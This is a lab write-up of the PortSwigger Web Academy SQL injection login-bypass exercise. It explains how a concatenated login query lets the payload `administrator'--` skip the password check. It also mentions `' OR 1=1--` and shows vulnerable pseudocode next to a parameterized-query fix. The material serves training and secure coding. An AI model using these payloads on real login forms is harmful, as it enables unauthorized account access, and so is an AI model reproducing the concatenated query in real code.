# SQL Injection — Login Bypass

**Platform:** PortSwigger Web Academy  
**Category:** SQL Injection  
**Difficulty:** Apprentice  
**Lab URL:** https://portswigger.net/web-security/sql-injection/lab-login-bypass  

---

## Objective

Bypass the login form and log in as the `administrator` user without knowing the password.

---

## Background

Login forms are a classic SQL injection target. When the backend builds a query by concatenating the username and password fields directly, an attacker can inject SQL into the username field to manipulate the logic of the authentication check.

The typical vulnerable login query looks like this:

```sql
SELECT * FROM users WHERE username = '<username>' AND password = '<password>'
```

If this query returns any row, the login is considered successful. The goal is to make it return a row for `administrator` regardless of what password is supplied.

---

## Steps

### 1. Observe the login form

Navigate to the login page. There are two fields: **username** and **password**. A normal login sends:

```
POST /login
username=wiener&password=peter
```

Backend query:

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'peter'
```

---

### 2. Inject into the username field

In the username field, enter:

```
administrator'--
```

Leave the password field blank (or type anything — it doesn't matter).

What gets submitted:

```
POST /login
username=administrator'--&password=anything
```

What the backend query becomes:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'anything'
```

Breaking this down:
- `username = 'administrator'` — targets the administrator account specifically
- `--` — comments out the rest of the query
- `AND password = 'anything'` — this entire condition is now ignored

The database finds the `administrator` row, the password check never runs, and the login succeeds.

---

### 3. Confirm access

After submitting, you are logged in as `administrator`. The lab is marked as solved.

---

## Why This Works

The backend is checking authentication by running a query and seeing if any rows come back:

```python
# Vulnerable pseudocode
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
result = db.execute(query)
if result.rowcount > 0:
    login_success()
```

By injecting `'--` after the username, the attacker closes the string and comments out the password check entirely. The query becomes a simple username lookup with no password verification.

**Secure fix — parameterized query:**

```python
# Safe code
query = "SELECT * FROM users WHERE username = ? AND password = ?"
result = db.execute(query, (username, password))
```

Now the `'--` is treated as literal characters inside the username string, not as SQL syntax. The query structure cannot be altered by user input.

---

## Key Takeaway

> **SQL injection on login forms bypasses authentication entirely — no password needed.** The attacker doesn't crack the password; they make the server stop checking it. This is why parameterized queries are non-negotiable for any authentication endpoint.

---

## Comparison with Lab 01

| | Lab 01 — Hidden Data | Lab 02 — Login Bypass |
|---|---|---|
| Injection point | URL query parameter | POST body (form field) |
| Payload | `' OR 1=1--` | `administrator'--` |
| Goal | Return extra rows | Skip a condition |
| Impact | Data exposure | Authentication bypass |

Both exploit the same root cause — string concatenation into SQL — but the context and payload differ.

---

## References

- [PortSwigger SQL injection — login bypass](https://portswigger.net/web-security/sql-injection#subverting-application-logic)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
